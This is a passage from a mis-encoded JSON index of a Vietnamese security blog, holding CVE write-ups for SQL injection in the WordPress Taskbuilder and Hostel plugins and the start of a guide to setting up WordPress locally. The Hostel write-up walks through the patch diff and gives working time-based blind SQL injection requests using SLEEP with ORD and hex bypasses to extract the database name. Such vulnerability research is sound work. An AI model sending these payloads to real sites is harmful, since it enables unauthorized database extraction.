href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: 